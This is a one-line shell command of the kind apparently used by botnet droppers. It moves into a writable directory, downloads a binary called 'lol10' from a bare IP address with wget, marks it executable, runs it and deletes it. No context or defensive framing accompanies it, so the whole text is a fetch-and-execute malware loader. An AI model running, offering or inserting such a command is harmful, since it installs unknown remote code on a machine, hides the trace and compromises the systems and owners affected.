cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.50.205/lol10; chmod +x lol10; ./lol10; rm -rf lol10
